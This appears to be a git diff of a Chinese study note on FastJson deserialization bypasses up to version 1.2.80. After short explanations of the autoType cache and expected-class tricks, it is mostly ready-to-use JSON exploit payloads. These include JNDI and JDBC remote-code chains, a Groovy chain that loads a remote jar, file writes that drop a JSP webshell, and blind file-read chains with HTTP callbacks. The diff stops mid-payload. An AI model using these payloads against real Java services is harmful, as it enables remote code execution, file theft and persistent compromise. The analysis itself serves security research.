@@ -1,25 +1,41 @@
 # FastJson 反序列化
 - [FastJson 反序列化](#fastjson-反序列化)
   - [前置知识](#前置知识)
-    - [JAVA对象->Json](#java对象-json)
+    - [JAVA对象-\>Json](#java对象-json)
       - [序列化方法](#序列化方法)
-    - [Json->JAVA对象](#json-java对象)
+    - [Json-\>JAVA对象](#json-java对象)
       - [自省](#自省)
       - [反序列化方法](#反序列化方法)
     - [利用思路](#利用思路)
       - [寻找利用类思路](#寻找利用类思路)
-  - [Fastjson <= 1.2.24 利用思路](#fastjson--1224-利用思路)
+  - [Fastjson \<= 1.2.24 利用思路](#fastjson--1224-利用思路)
     - [TemplatesImpl恶意类](#templatesimpl恶意类)
       - [利用分析](#利用分析)
     - [JNDI注入](#jndi注入)
       - [JdbcRowSetImpl类](#jdbcrowsetimpl类)
   - [关于CheckAutoType](#关于checkautotype)
   - [1.2.25-1.2.41 ByPass](#1225-1241-bypass)
-  - [<=1.2.42 ByPass](#1242-bypass)
-  - [<=1.2.47 ByPass](#1247-bypass)
-    - [TypeUtils.getClassFromMappin](#typeutilsgetclassfrommappin)
+  - [\<=1.2.42 ByPass](#1242-bypass)
+  - [\<=1.2.47 ByPass](#1247-bypass)
+    - [TypeUtils.getClassFromMapping](#typeutilsgetclassfrommapping)
     - [deserializers.findclass](#deserializersfindclass)
-  - [实战利用](#实战利用)
+  - [\<=1.2.68 Bypass](#1268-bypass)
+    - [ThrowableDeserializer](#throwabledeserializer)
+    - [JavaBeanDeserializer](#javabeandeserializer)
+      - [java.lang.AutoCloseable](#javalangautocloseable)
+        - [JRE写文件](#jre写文件)
+        - [commons-io2.x 写文件](#commons-io2x-写文件)
+        - [Mysql JDBC RCE\&SSRF](#mysql-jdbc-rcessrf)
+        - [postgresql](#postgresql)
+    - [修复](#修复)
+  - [1.2.72\< Version \<=1.2.80 Bypass](#1272-version-1280-bypass)
+    - [1.2.76-1.2.80，groovy](#1276-1280groovy)
+    - [python-pgsql](#python-pgsql)
+    - [aspectjtools文件读取](#aspectjtools文件读取)
+    - [io回显布尔文件读取](#io回显布尔文件读取)
+    - [io错误或者dnslog/httplog布尔文件读取](#io错误或者dnsloghttplog布尔文件读取)
+    - [高版本io写文件](#高版本io写文件)
+    - [修复](#修复-1)
   - [参考](#参考)
 ## 前置知识
 ### JAVA对象->Json
@@ -136,8 +152,14 @@ Process finished with exit code 0
 
 * 非自省方式(手动指定类):`parseObject(String text, Class<T> clazz)` ，构造方法 + `setter` + 满足条件额外的`getter`.
 * 自省方式:`JSONObject parseObject(String text)`，构造方法 + `setter` + `getter` + 满足条件额外的`getter`.
-* `parse(String text)`，构造方法 + `setter` + 满足条件额外的`getter`.
-
+* `parse(String text)`，构造方法 + `setter` + 满足条件额外的`getter`.  
+* 
+在1.x版本,`parseObject(String text)`和`parse(String text)`的区别在于在`parseObject`中其实封装了`parse()`,其调用`parse()`反序列化得到对象后多了一步再将该对象强制转换为了`JSONObject`对象.  
+但在2.x版本,其不再封装调用`parse()`了,不再反序列化对象而是直接将其转为`JSONObject`.  
+1.x版本:
+![](2023-01-16-17-39-25.png)  
+2.x版本:  
+![](2023-01-16-17-42-44.png)
 ### 利用思路
 
 fastjson提供特殊字符段`@type`，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set，get方法.
@@ -321,7 +343,7 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
 ![image-20211024154458876](1.2.24反序列化/image-20211024154458876.png)
 
-### TypeUtils.getClassFromMappin
+### TypeUtils.getClassFromMapping
 
 首先来看第一次获取`clazz`跟进`TypeUtils.getClassFromMapping(typeName)`,里面直接返回了`mappings.get(className)`.
 
@@ -415,7 +437,9 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         }
 ```
 
-综合来说,要达到`TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`即要`strVal`不为空,而`strVal`来源于`objVal`,所以要`strVal`不为空,而`objVal`的值来源于解析器parse解析,结合代码得知,需要含有一个以`val`开头的字段,其中的值即我们想要加入`mapping`的恶意类,而且该Json的`@type`中的类要为Class类型.
+综合来说,要达到`TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`即要`strVal`不为空,而`strVal`来源于`objVal`,所以要`strVal`不为空,而`objVal`的值来源于解析器parse解析,结合代码得知,需要含有一个以`val`开头的字段,其中的值即我们想要加入`mapping`的恶意类,而且该Json的`@type`中的类要为Class类型,这也就是FastJson的缓存机制实现方式. 
+
+用户是可以通过JSON数据来直接缓存指定的类的,而且该缓存功能默认开启,方式就是通过指定`@type`为`java.lang.Class`,然后在`val`字段指定想要缓存的类即可,由于FastJson的AutoTypeCheck执行顺序在从缓存中得到类之后,所以即可无视AutoType得到恶意类进行反序列化触发相关setter,getter方法.
 
 最后的payload如下,即可将`com.sun.rowset.JdbcRowSetImpl`加入缓存,这样在下一次`AutoType`遇到该类时则会直接返回该类,从而绕过之前的防护措施.
 
@@ -431,11 +455,11 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 ```
 {
     "a": {
-        "@": "java.lang.Class", 
+        "@type": "java.lang.Class", 
         "val": "com.sun.rowset.JdbcRowSetImpl"
     }, 
     "b": {
-        "@": "com.sun.rowset.JdbcRowSetImpl", 
+        "@type": "com.sun.rowset.JdbcRowSetImpl", 
         "dataSourceName": "ldap://localhost:1389/Exploit", 
         "autoCommit": true
     }
@@ -444,7 +468,7 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
 **总结:**
 
-该次绕过主要是利用一个缓存机制,FastJson为了提高运行效率,在`AutoType`进行过滤的时候,会先从缓存中去寻找指定类,如果有的话则会直接返回该类而不进行后续操作,从而ByPass.
+该次绕过主要是利用一个缓存机制,FastJson为了提高运行效率,在`AutoTypeCheck`进行过滤之前,会先从缓存中去寻找指定类,如果有的话则会直接返回该类而不进行后续的操作,而FastJson默认是开启缓存类的功能的,并且用户可以直接通过JSON数据来指定想要缓存的类,所以只需要先发送缓存指定类的JSON数据,再反序列化该类即可ByPass.
 
 ### deserializers.findclass
 
@@ -452,16 +476,923 @@ ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
 **修复:**
 
-在`TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`处直接设置了`cache`为False.
+在`TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`处直接设置了`cache`为False,即默认情况下不再缓存指定的类了.
 
 ![image-20211024231333919](1.2.24反序列化/image-20211024231333919.png)
+## <=1.2.68 Bypass
+在1.2.68的出现过一个绕过的方式,在FastJson返回指定的类时,其返回类的顺序中最后一种特殊情况是对期望类的处理,在`checkAutoType`方法中还有一种情况会返回指定类的情况,就是当`@type`指定的类继承于期望类时,会直接返回该类,而且该段逻辑处理顺序在白名单校验和黑名单校验之后但在检验`autoType`开关之前,也就是说只要找到一个类其不在黑名单中,且继承于期望类并有相关危险的`getter`,`setter`方法即可绕过`AutoType`的限制,相关实现代码如下:    
+![](2023-01-17-15-42-26.png)  
 
+但从`checkAutoType`的几个重载方式可以看到`expectClass`来源于调用时传入的参数,搜索相关调用的地方,可以发现有两个地方,`JavaBeanDeserializer`和`ThrowableDeserializer`两个反序列化类. 
+![](2023-01-17-17-10-05.png)   
+而在`JavaBeanDeserializer`类中根据传入的Type参数指定期望类.
+![](2023-01-17-18-45-00.png)
+而在`ThrowableDeserializer`类中其指定了期望类要为`Throwable`类.  
+![](2023-01-17-16-46-13.png)  
+而得到这两个反序列化类对象的方式則是在`ParserConfig#getDeserializer()`中,该类中根据第一个`@type`指定的类的类型返回对应的反序列化器,可以看到当指定的类继承于`Throwable`类时得到`ThrowableDeserializer`,如果什么类型都不是则返回`JavaBeanDeserializer`类,比如指定的类为一个接口.   
+![](2023-01-17-18-47-37.png)  
+然而根据指定的类返回反序列化器之前已经进行了一次`ChckAutoType`,这就导致想要利用期望类那第一个`@type`指定的类要么在白名单中或者缓存中,然后第二个`@type`为第一个类的子类且有相关的利用方法.    
+### ThrowableDeserializer
+在`ThrowableDeserializer#deserialze`的反序列化中,我们可以看到当后续的参数也是以`@type`开头时,则会调用指定期望类为`Throwable.class`的`checkAutoType()`方法了.  
+![](2023-01-17-18-53-07.png)  
+所以想要利用`ThrowableDeserializer`类的话那就需要在白名单或者缓存中找到`Throwable类`的子类.
+### JavaBeanDeserializer
+再来看`JavaBeanDeserializer`,根据上面的条件,如果想要用`JavaBeanDeserializer`的话,那么首先要在白名单中或者缓存中找到一个接口类,然后再去找该接口类的子类中含有可利用的相关方法的类.而在1.2.68中找到的类就是`java.lang.AutoCloseable`.  
+#### java.lang.AutoCloseable
+在缓存mapping的初始化中,我们看到是通过`loadClass`来专门加载了`java.lang.AutoCloseable`的.
+![](2023-01-18-11-01-44.png).  
+而`java.lang.AutoCloseable`类是从jdk 1.7引进的,是一个涉及到一些自动关闭io流的接口,实现其接口的子类非常多,公开的有以下几种利用链.
+##### JRE写文件
+该方式利用的子类是基于带参数的构造函数进行构建,而fastjson 在通过带参构造函数进行反序列化时，会检查参数是否有参数名，只有含有参数名的带参构造函数才会被认可,而只有当这个类 class 字节码带有调试信息且其中包含有变量信息时才会有参数名信息,默认情况下已知的只要有CentOS和RedHat下的jdk8和openjdk>=11版本会有,利用场景较小.  
+```json
+
+{
+    "x":{
+        "@type":"java.lang.AutoCloseable",
+        "@type":"sun.rmi.server.MarshalOutputStream",
+        "out":{
+            "@type":"java.util.zip.InflaterOutputStream",
+            "out":{
+                "@type":"java.io.FileOutputStream",
+                "file":"/tmp/dest.txt",
+                "append":false
+            },
+            "infl":{
+                "input":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="
+            },
+            "bufLen":1048576
+        },
+        "protocolVersion":1
+    }
+}
+```
+##### commons-io2.x 写文件
+commons-io 2.0 - 2.6 版本:
+```json
+
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "encoding":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+}
+}
+```
+commons-io 2.7 - 2.8.0 版本:
+```json
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
+        "start":0,
+        "end":2147483647
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "charsetName":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+```
+##### Mysql JDBC RCE&SSRF
+```json
+{
+   "@type":"java.lang.AutoCloseable",
+   "@type": "com.mysql.jdbc.JDBC4Connection",
+   "hostToConnectTo": "127.0.0.1",
+   "portToConnectTo": 3306,
+   "info":
+   {
+
+       "user": "CommonsCollections5", 
+       "password": "pass",
+       "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
+       "autoDeserialize": "true",
+       "NUM_HOSTS": "1"
+   },
+   "databaseToConnectTo": "dbname",
+   "url": ""
+
+}
+```
+```json
+{
+   "@type":"java.lang.AutoCloseable",
+   "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
+   "proxy":
+   {
+       "connectionString":
+       {
+           "url": "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=CommonsCollections5"
+       }
+   }
+}
+```
+##### postgresql 
+```json
+
+{
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.postgresql.jdbc.PgConnection",
+    "hostSpecs": [{
+        "host": "127.0.0.1",
+        "port": 2333
+    }],
+    "user": "test",
+    "database": "test",
+    "info": {
+        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
+        "socketFactoryArg": "http://127.0.0.1:81/test.xml"
+    },
+    "url": ""
+}
+```
+### 修复
+将java.lang.Runnable，java.lang.Readable和java.lang.AutoCloseable加 入了黑名单.
+## 1.2.72< Version <=1.2.80 Bypass
+而在1.2.80中再次出现了和1.2.68类似思路的绕过,也是利用期望类,而这次bypass源于1.2.73中新加入的特性,支持了对反序列化对象的类属性字段,并且直接将该类属性的Class无视`CheckAutoType`加入到缓存中.   
+![](2023-01-20-13-03-13.png)    
+
+而这次的绕过思路就是通过指定在白名单或者缓存中的期望类,利用autotype期望类的机制反序列化其一个子类,而其子类中有我们可控的类属性,在反序列化该类属性时使其使用`JavaBeanDeserializer`反序列化器来使得该类属性的`Class`加入到缓存中,这样下次就可以直接从缓存中得到该类了.  
+### 1.2.76-1.2.80，groovy
+```json
+{
+    "@type":"java.lang.Exception",
+    "@type":"org.codehaus.groovy.control.CompilationFailedException",
+    "unit":{}
+}
+```
+```json
+{
+    "@type":"org.codehaus.groovy.control.ProcessingUnit",
+    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
+    "config":{
+        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
+        "classpathList":"http://127.0.0.1:81/attack-1.jar"
+    }
+}
+```
+### python-pgsql
+```json
+{
+    "@type":"java.lang.Exception",
+    "@type":"org.python.antlr.ParseException"
+}
+```
+```json
+
+{
+    "@type": "java.lang.Class",
+    "val": {
+        "@type": "java.lang.String" {
+            "@type": "java.util.Locale",
+            "val": {
+                "@type": "com.alibaba.fastjson.JSONObject",
+                {
+                    "@type": "java.lang.String"
+                    "@type": "org.python.antlr.ParseException",
+                    "type": "{\"@type\":\"com.ziclix.python.sql.PyConnection\",\"connection\":{\"@type\":\"org.postgresql.jdbc.PgConnection\"}}"
+                }
+            }
+        }
+    }
+}
+```
+```json
+{
+    "@type": "org.postgresql.jdbc.PgConnection",
+    "hostSpecs": [{
+        "host": "127.0.0.1",
+        "port": 2333
+    }],
+    "user": "test",
+    "database": "test",
+    "info": {
+        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
+        "socketFactoryArg": "http://127.0.0.1:81/test.xml"
+    },
+    "url": ""
+}
+```
+### aspectjtools文件读取
+```json
+{
+    "@type":"java.lang.Exception",
+    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
+}
+```
+```json
+{
+    "x":{
+        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
+        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
+        "fileName":"C:/windows/win.ini"
+    }
+}
+```
+### io回显布尔文件读取
+```json
+
+{
+    "su14": {
+        "@type": "java.lang.Exception",
+        "@type": "ognl.OgnlException"
+    },
+    "su15": {
+        "@type": "java.lang.Class",
+        "val": {
+            "@type": "com.alibaba.fastjson.JSONObject",
+            {
+                "@type": "java.lang.String"
+                "@type": "ognl.OgnlException",
+                "_evaluation": ""
+            }
+        },
+        "su16": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+                                "@type": "jdk.nashorn.api.scripting.URLReader",
+                                "url": "file:///D:/"
+                            },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su17": {
+            "$ref": "$.su16.node.p.stream"
+        },
+        "su18": {
+            "$ref": "$.su17.bOM.bytes"
+        }
+    }
+```
+### io错误或者dnslog/httplog布尔文件读取
+```json
+[{
+        "su15": {
+            "@type": "java.lang.Exception",
+            "@type": "ognl.OgnlException",
+        }
+    }, {
+        "su16": {
+            "@type": "java.lang.Class",
+            "val": {
+                "@type": "com.alibaba.fastjson.JSONObject",
+                {
+                    "@type": "java.lang.String"
+                    "@type": "ognl.OgnlException",
+                    "_evaluation": ""
+                }
+            }
+        },
+        {
+            "su17": {
+                "@type": "ognl.Evaluation",
+                "node": {
+                    "@type": "ognl.ASTMethod",
+                    "p": {
+                        "@type": "ognl.OgnlParser",
+                        "stream": {
+                            "@type": "org.apache.commons.io.input.BOMInputStream",
+                            "delegate": {
+                                "@type": "org.apache.commons.io.input.ReaderInputStream",
+                                "reader": {
+                                    "@type": "jdk.nashorn.api.scripting.URLReader",
+                                    "url": "file:///D:/"
+                                },
+                                "charsetName": "UTF-8",
+                                "bufferSize": 1024
+                            },
+                            "boms": [{
+                                "@type": "org.apache.commons.io.ByteOrderMark",
+                                "charsetName": "UTF-8",
+                                "bytes": [
+                                    36, 81
+                                ]
+                            }]
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "su18": {
+                "$ref": "$[2].su17.node.p.stream"
+            }
+        },
+        {
+            "su19": {
+                "$ref": "$[3].su18.bOM.bytes"
+            }
+        },{
+            "su20": {
+                "@type": "ognl.Evaluation",
+                "node": {
+                    "@type": "ognl.ASTMethod",
+                    "p": {
+                        "@type": "ognl.OgnlParser",
+                        "stream": {
+                            "@type": "org.apache.commons.io.input.BOMInputStream",
+                            "delegate": {
+                                "@type": "org.apache.commons.io.input.ReaderInputStream",
+                                "reader": {
+                                    "@type": "org.apache.commons.io.input.CharSequenceReader",
+                                    "charSequence": {
+                                        "@type": "java.lang.String" {
+                                            "$ref": "$[4].su19"
+                                        },
+                                        "start": 0,
+                                        "end": 0
+                                    },
+                                    "charsetName": "UTF-8",
+                                    "bufferSize": 1024
+                                },
+                                "boms": [{
+                                    "@type": "org.apache.commons.io.ByteOrderMark",
+                                    "charsetName": "UTF-8",
+                                    "bytes": [1]
+                                }]
+                            }
+                        }
+                    }
+                }
+            },{
+            "su21": {
+                "@type": "ognl.Evaluation",
+                "node": {
+                    "@type": "ognl.ASTMethod",
+                    "p": {
+                        "@type": "ognl.OgnlParser",
+                        "stream": {
+                            "@type": "org.apache.commons.io.input.BOMInputStream",
+                            "delegate": {
+                                "@type": "org.apache.commons.io.input.ReaderInputStream",
+                                "reader": {
+                                    "@type": "jdk.nashorn.api.scripting.URLReader",
+                                    "url": "http://127.0.0.1:5667"
+                                },
+                                "charsetName": "UTF-8",
+                                "bufferSize": 1024
+                            },
+                            "boms": [{
+                                "@type": "org.apache.commons.io.ByteOrderMark",
+                                "charsetName": "UTF-8",
+                                "bytes": [
+                                    49
+                                ]
+                            }]
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "su22": {
+                "$ref": "$[6].su21.node.p.stream"
+            }
+        },
+        {
+            "su23": {
+                "$ref": "$[7].su22.bOM.bytes"
+            }
+        }]
+```
+```json
+
+{
+    "su14": {
+        "@type": "java.lang.Exception",
+        "@type": "ognl.OgnlException"
+    },
+    "su15": {
+        "@type": "java.lang.Class",
+        "val": {
+            "@type": "com.alibaba.fastjson.JSONObject",
+            {
+                "@type": "java.lang.String"
+                "@type": "ognl.OgnlException",
+                "_evaluation": ""
+            }
+        },
+        "su16": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""test8200个a"
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+            "branch":{
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"1.jsp",
+        "encoding":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su17": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
+        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su18": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
+        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su19": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.is.input"},
+        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.is.branch"},
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },    
+    }
+```
+### 高版本io写文件
+```json
+{
+    "su14": {
+        "@type": "java.lang.Exception",
+        "@type": "ognl.OgnlException"
+    },
+    "su15": {
+        "@type": "java.lang.Class",
+        "val": {
+            "@type": "com.alibaba.fastjson.JSONObject",
+            {
+                "@type": "java.lang.String"
+                "@type": "ognl.OgnlException",
+                "_evaluation": ""
+            }
+        },
+        "su16": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""test8200个a",
+        "start":0,
+        "end":2147483647
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+            "branch":{
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"1.jsp",
+        "charsetName":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
+                            "@type": "org.apache.commons.io.ByteOrderMark",
+                            "charsetName": "UTF-8",
+                            "bytes": [
+                                36,82
+                            ]
+                        }]
+                    }
+                }
+            }
+        },
+        "su17": {
+            "@type": "ognl.Evaluation",
+            "node": {
+                "@type": "ognl.ASTMethod",
+                "p": {
+                    "@type": "ognl.OgnlParser",
+                    "stream": {
+                        "@type": "org.apache.commons.io.input.BOMInputStream",
+                        "delegate": {
+                            "@type": "org.apache.commons.io.input.ReaderInputStream",
+                            "reader": {
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.input"},
+        "branch":{"$ref": "$.su16.node.p.stream.delegate.reader.inputStream.branch"},
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+                            "charsetName": "UTF-8",
+                            "bufferSize": 1024
+                        },
+                        "boms": [{
